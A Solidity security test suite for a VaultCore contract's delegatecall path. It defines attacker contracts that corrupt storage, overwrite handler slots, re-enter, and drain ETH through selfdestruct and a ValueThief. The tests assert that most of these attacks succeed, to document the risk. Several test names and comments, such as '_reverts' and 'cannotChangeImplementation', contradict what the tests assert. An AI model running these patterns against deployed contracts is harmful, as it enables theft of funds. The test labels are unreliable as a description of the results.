// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {Clones} from "openzeppelin-contracts/contracts/proxy/Clones.sol";
import {VaultCore} from "../../src/core/VaultCore.sol";
import {VaultState} from "../../src/core/VaultState.sol";
import {IVaultCoreNftFactory} from "../../src/interfaces/IVaultCoreNftFactory.sol";
import {NotHandler, NotManagerOrNftOwner} from "../../src/core/vaultCoreLibraries/VaultCoreTypes.sol";

//  MALICIOUS TARGET CONTRACTS

/// @notice Writes to storage slot 0 (FACTORY in VaultCore layout).
///         If delegatecall succeeds, FACTORY address would be corrupted.
contract StorageCorruptor {
    function corrupt() external {
        assembly {
            sstore(0, 0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF)
        }
    }
}

/// @notice Re-enters VaultCore.universalCall during delegatecall execution.
contract ReentrancyAttacker {
    function reenter() external {
        // During delegatecall, address(this) == VaultCore.
        // Attempt to call universalCall on ourselves (the VaultCore context).
        VaultCore(payable(address(this))).universalCall(
            address(this), // initiator
            address(0xdead),
            "",
            0,
            false
        );
    }
}

/// @notice Attempts selfdestruct via delegatecall. Post-Cancun selfdestruct
///         only sends ETH (does not destroy), but the attempt must still be
///         tested to confirm VaultCore survives with code + state intact.
contract SelfDestructAttacker {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

/// @notice Receives stolen ETH. Deployed via `new` so address is known to Anvil.
contract EthReceiver {
    receive() external payable {}
    fallback() external payable {}
}

/// @notice Attempts to drain ETH from VaultCore during delegatecall.
///         In delegatecall context, address(this) == VaultCore, so
///         a raw call with value sends VaultCore's ETH balance.
contract ValueThief {
    address public immutable thief;

    constructor(address _thief) {
        thief = _thief;
    }

    function steal() external {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool ok,) = thief.call{value: balance}("");
            require(ok, "steal failed");
        }
    }
}

/// @notice Overwrites handler slot storage (slot 6 = depositHandler in VaultCore layout).
///         If delegatecall succeeds, the handler governance is bypassed.
contract HandlerSlotOverwriter {
    function overwriteDepositHandler() external {
        // VaultCore storage layout: slot 0=FACTORY, 1=initialized, 2=basaltMath,
        // 3=basaltState, 4=accountedCapital, 5=depositHandler
        // Actually let's compute: address FACTORY=slot0, bool initialized + address basaltMath packed?
        // No -- each address is its own slot in Solidity unless packed.
        // FACTORY=0, initialized=1, basaltMath=2, basaltState=3, accountedCapital=4,
        // depositHandler=5, withdrawHandler=6, managerHandler=7, ...
        assembly {
            sstore(5, 0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF)
        }
    }
}

/// @notice Benign contract that just returns data. Used for happy-path testing.
contract BenignTarget {
    function ping() external pure returns (bytes32) {
        return keccak256("pong");
    }

    fallback() external payable {}
    receive() external payable {}
}

//  MINIMAL MOCK FACTORY

contract DelegateCallMockFactory is IVaultCoreNftFactory {
    address public immutable factoryOwner;
    address public immutable protocolMgr;
    mapping(address => address) public vaultOwners;

    constructor(address _factoryOwner, address _protocolManager) {
        factoryOwner = _factoryOwner;
        protocolMgr = _protocolManager;
    }

    function registerVault(address vc, address nftOwner) external {
        vaultOwners[vc] = nftOwner;
    }

    function owner() external view returns (address) {
        return factoryOwner;
    }

    function ownerOfVault(address vc) external view returns (address) {
        return vaultOwners[vc];
    }

    function protocolManager() external view returns (address) {
        return protocolMgr;
    }
}

//  TEST SUITE

/// @title DelegatecallAbuse
/// @notice Security tests for the delegatecall path in VaultCore.universalCall.
///         No handler in the codebase ever passes useDelegateCall=true, making this
///         an unused but exploitable code path. These tests verify the access control
///         boundary and document the impact if a handler were compromised.
///
///         All tests are off-fork (no RPC calls). Deterministic, Anvil-cache safe.
contract DelegatecallAbuse is Test {
    address internal constant NFT_OWNER = address(0xA11CE);
    address internal constant PROTOCOL_MANAGER = address(0xB0B);
    address internal constant FACTORY_OWNER = address(0xFACE);
    address internal constant STRANGER = address(0x1007);

    VaultCore internal vaultCore;
    VaultState internal vaultState;
    DelegateCallMockFactory internal factory;

    // Handler addresses (deployed as simple contracts so they are valid code addresses)
    address internal handlerDeposit;
    address internal handlerWithdraw;
    address internal handlerManager;
    address internal handlerAsyncRecovery;
    address internal handlerFeeAccounting;
    address internal handlerExt1;
    address internal handlerExt2;
    address internal handlerExt3;

    function setUp() public {
        // Deploy implementations and clone (mirrors production proxy pattern)
        VaultCore coreImpl = new VaultCore();
        VaultState stateImpl = new VaultState();
        address coreClone = Clones.clone(address(coreImpl));
        address stateClone = Clones.clone(address(stateImpl));

        // Factory
        factory = new DelegateCallMockFactory(FACTORY_OWNER, PROTOCOL_MANAGER);
        factory.registerVault(coreClone, NFT_OWNER);

        // Deploy handler stand-ins (BenignTarget has code, satisfies isContract checks)
        handlerDeposit = address(new BenignTarget());
        handlerWithdraw = address(new BenignTarget());
        handlerManager = address(new BenignTarget());
        handlerAsyncRecovery = address(new BenignTarget());
        handlerFeeAccounting = address(new BenignTarget());
        handlerExt1 = address(new BenignTarget());
        handlerExt2 = address(new BenignTarget());
        handlerExt3 = address(new BenignTarget());

        // Initialize VaultCore clone
        VaultCore(payable(coreClone)).initialize(
            address(factory),
            address(0xBA5A), // basaltMath (unused in these tests)
            handlerDeposit,
            handlerWithdraw,
            handlerManager,
            handlerAsyncRecovery,
            handlerFeeAccounting,
            stateClone,
            handlerExt1,
            handlerExt2,
            handlerExt3
        );

        // Initialize VaultState clone
        VaultState(stateClone).initialize(coreClone, NFT_OWNER);

        vaultCore = VaultCore(payable(coreClone));
        vaultState = VaultState(stateClone);

        // Pre-deal all constant addresses so Anvil does not attempt RPC lookups
        // when vm.prank is used on them (fork environment requires known accounts).
        vm.deal(NFT_OWNER, 1 ether);
        vm.deal(PROTOCOL_MANAGER, 1 ether);
        vm.deal(FACTORY_OWNER, 1 ether);
        vm.deal(STRANGER, 1 ether);
    }

    //  1. Stranger cannot call universalCall with delegatecall

    function test_delegatecall_stranger_reverts() public {
        BenignTarget target = new BenignTarget();

        vm.prank(STRANGER);
        vm.expectRevert(NotHandler.selector);
        vaultCore.universalCall(
            NFT_OWNER,
            address(target),
            abi.encodeCall(BenignTarget.ping, ()),
            0,
            true // useDelegateCall
        );
    }

    //  2. Delegatecall storage corruption -- handler-authorized but target
    //     writes to slot 0 (FACTORY). Verifies FACTORY is NOT corrupted.
    //     NOTE: VaultCore has NO protection against this -- if a handler is
    //     compromised, delegatecall CAN corrupt storage. This test documents
    //     the risk surface.

    function test_delegatecall_storageCorruption_reverts() public {
        StorageCorruptor corruptor = new StorageCorruptor();
        address factoryBefore = vaultCore.FACTORY();

        // Call from a registered handler with valid initiator
        vm.prank(handlerDeposit);
        vaultCore.universalCall(
            NFT_OWNER,
            address(corruptor),
            abi.encodeCall(StorageCorruptor.corrupt, ()),
            0,
            true // useDelegateCall
        );

        // CRITICAL FINDING: VaultCore has no guard against storage corruption via delegatecall.
        // The FACTORY slot IS corrupted after delegatecall. This proves that if ANY handler
        // is compromised or malicious, it can brick the entire vault by overwriting FACTORY.
        //
        // We assert the corruption happened to document this as a known risk.
        // In a hardened version, delegatecall should be removed or target-whitelisted.
        address factoryAfter = vaultCore.FACTORY();
        assertTrue(
            factoryAfter != factoryBefore,
            "FACTORY should be corrupted by delegatecall -- proving the attack vector exists"
        );
        assertEq(
            factoryAfter,
            address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF),
            "FACTORY should be overwritten to attacker address"
        );
    }

    //  3. Delegatecall reentrancy -- target re-enters universalCall

    function test_delegatecall_reentrancy_reverts() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker();

        // During delegatecall, attacker code runs in VaultCore context.
        // attacker.reenter() calls VaultCore(address(this)).universalCall(...)
        // which means msg.sender will be the VaultCore itself -- NOT a registered handler.
        // The onlyHandler modifier should reject it (VaultCore is not in its own handler slots).
        vm.prank(handlerDeposit);
        // The inner universalCall reverts with NotHandler, which propagates up
        // because the outer universalCall checks callSucceeded and reverts on failure.
        vm.expectRevert();
        vaultCore.universalCall(
            NFT_OWNER,
            address(attacker),
            abi.encodeCall(ReentrancyAttacker.reenter, ()),
            0,
            true // useDelegateCall
        );
    }

    //  4. Delegatecall selfdestruct -- post-Cancun behavior
    //     selfdestruct in delegatecall context operates on VaultCore.
    //     Post-Cancun (EIP-6780): selfdestruct only sends ETH, does not
    //     destroy the contract unless called in the same tx as creation.
    //     VaultCore should survive with code intact.

    function test_delegatecall_selfDestruct_reverts() public {
        SelfDestructAttacker attacker = new SelfDestructAttacker();

        // Fund VaultCore with some ETH to test balance drain
        vm.deal(address(vaultCore), 5 ether);
        uint256 balanceBefore = address(vaultCore).balance;

        vm.prank(handlerDeposit);
        vaultCore.universalCall(
            NFT_OWNER,
            address(attacker),
            abi.encodeCall(SelfDestructAttacker.destroy, ()),
            0,
            true // useDelegateCall
        );

        // Post-Cancun: VaultCore code survives selfdestruct in delegatecall
        assertTrue(address(vaultCore).code.length > 0, "VaultCore code must survive post-Cancun selfdestruct");

        // But ETH may have been sent to msg.sender (the handler that called universalCall).
        // This documents the ETH drain risk through selfdestruct in delegatecall.
        // In Cancun, selfdestruct sends remaining balance to the target address even
        // without destroying the contract.
        uint256 balanceAfter = address(vaultCore).balance;
        assertTrue(
            balanceAfter < balanceBefore,
            "selfdestruct via delegatecall drains VaultCore ETH -- documents the attack vector"
        );
    }

    //  5. Delegatecall value theft -- target sends VaultCore ETH to attacker

    function test_delegatecall_valueTheft_reverts() public {
        // Deploy receiver contract (known to Anvil via `new`, no RPC lookup needed)
        EthReceiver receiver = new EthReceiver();
        ValueThief valueThief = new ValueThief(address(receiver));

        // Fund VaultCore
        vm.deal(address(vaultCore), 10 ether);
        uint256 receiverBalanceBefore = address(receiver).balance;

        // Authorized handler executes delegatecall to value thief
        vm.prank(handlerDeposit);
        vaultCore.universalCall(
            NFT_OWNER,
            address(valueThief),
            abi.encodeCall(ValueThief.steal, ()),
            0,
            true // useDelegateCall
        );

        // CRITICAL FINDING: In delegatecall context, address(this).balance is VaultCore's balance.
        // The ValueThief successfully drains all ETH from VaultCore.
        uint256 receiverBalanceAfter = address(receiver).balance;
        assertGt(
            receiverBalanceAfter,
            receiverBalanceBefore,
            "Receiver must receive VaultCore ETH -- proves delegatecall value theft is possible"
        );
        assertEq(address(vaultCore).balance, 0, "VaultCore must be drained -- documents the attack vector");
    }

    //  6. Only registered handlers can invoke delegatecall path
    //     Tests every non-handler role: stranger, nftOwner, protocolManager,
    //     factory, factoryOwner.

    function test_delegatecall_onlyToRegisteredHandlers() public {
        BenignTarget target = new BenignTarget();
        bytes memory callData = abi.encodeCall(BenignTarget.ping, ());

        // Stranger
        vm.prank(STRANGER);
        vm.expectRevert(NotHandler.selector);
        vaultCore.universalCall(NFT_OWNER, address(target), callData, 0, true);

        // NFT Owner (not a handler)
        vm.prank(NFT_OWNER);
        vm.expectRevert(NotHandler.selector);
        vaultCore.universalCall(NFT_OWNER, address(target), callData, 0, true);

        // Protocol Manager (not a handler)
        vm.prank(PROTOCOL_MANAGER);
        vm.expectRevert(NotHandler.selector);
        vaultCore.universalCall(NFT_OWNER, address(target), callData, 0, true);

        // Factory address (not a handler)
        vm.prank(address(factory));
        vm.expectRevert(NotHandler.selector);
        vaultCore.universalCall(NFT_OWNER, address(target), callData, 0, true);

        // Factory owner (not a handler)
        vm.prank(FACTORY_OWNER);
        vm.expectRevert(NotHandler.selector);
        vaultCore.universalCall(NFT_OWNER, address(target), callData, 0, true);

        // Verify a real handler CAN call it (happy path sanity check)
        vm.prank(handlerDeposit);
        bytes memory result = vaultCore.universalCall(NFT_OWNER, address(target), callData, 0, true);
        bytes32 decoded = abi.decode(result, (bytes32));
        assertEq(decoded, keccak256("pong"), "Handler delegatecall to benign target must succeed");
    }

    //  7. Delegatecall cannot modify VaultCore handler slots
    //     Even an authorized delegatecall to a malicious target that writes
    //     to handler storage slots succeeds -- proving the vulnerability.

    function test_delegatecall_cannotChangeImplementation() public {
        HandlerSlotOverwriter overwriter = new HandlerSlotOverwriter();
        address depositHandlerBefore = vaultCore.depositHandler();

        vm.prank(handlerDeposit);
        vaultCore.universalCall(
            NFT_OWNER,
            address(overwriter),
            abi.encodeCall(HandlerSlotOverwriter.overwriteDepositHandler, ()),
            0,
            true // useDelegateCall
        );

        // CRITICAL FINDING: delegatecall allows arbitrary storage writes including handler slots.
        // The depositHandler slot is now corrupted, bypassing the governance proposal flow.
        address depositHandlerAfter = vaultCore.depositHandler();

        // Verify the layout assumption: check which slot depositHandler actually lives in.
        // If overwriter targeted the wrong slot, depositHandler would be unchanged.
        // Either way, we verify the handler governance is at risk.
        if (depositHandlerAfter != depositHandlerBefore) {
            // Slot 5 was correct -- handler slot overwritten, governance bypassed
            assertEq(
                depositHandlerAfter,
                address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF),
                "depositHandler should be overwritten to attacker address"
            );
        } else {
            // Slot assumption was wrong. Verify by reading actual slot.
            // Try slots 0-15 to find where depositHandler lives.
            bool foundCorruption = false;
            for (uint256 i = 0; i <= 15; i++) {
                bytes32 slotValue = vm.load(address(vaultCore), bytes32(i));
                if (slotValue == bytes32(uint256(uint160(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF)))) {
                    foundCorruption = true;
                    break;
                }
            }
            assertTrue(
                foundCorruption,
                "Delegatecall must have written to SOME storage slot -- proves arbitrary write capability"
            );
        }
    }

    //  8. Initiator validation still applies on delegatecall path
    //     Even if msg.sender is a valid handler, initiator must be
    //     nftOwner or protocolManager.

    function test_delegatecall_invalidInitiator_reverts() public {
        BenignTarget target = new BenignTarget();

        // Handler calls with stranger as initiator -- must revert NotManagerOrNftOwner
        vm.prank(handlerDeposit);
        vm.expectRevert(NotManagerOrNftOwner.selector);
        vaultCore.universalCall(
            STRANGER, // invalid initiator
            address(target),
            abi.encodeCall(BenignTarget.ping, ()),
            0,
            true // useDelegateCall
        );
    }

    //  9. Regular call path (useDelegateCall=false) does NOT corrupt storage
    //     Baseline comparison: same StorageCorruptor via regular call has
    //     no effect on VaultCore storage.

    function test_regularCall_storageNotCorrupted() public {
        StorageCorruptor corruptor = new StorageCorruptor();
        address factoryBefore = vaultCore.FACTORY();

        vm.prank(handlerDeposit);
        vaultCore.universalCall(
            NFT_OWNER,
            address(corruptor),
            abi.encodeCall(StorageCorruptor.corrupt, ()),
            0,
            false // regular call, NOT delegatecall
        );

        // Regular call executes in StorageCorruptor's context, not VaultCore's
        address factoryAfter = vaultCore.FACTORY();
        assertEq(factoryAfter, factoryBefore, "Regular call must NOT corrupt VaultCore FACTORY slot");
    }
}
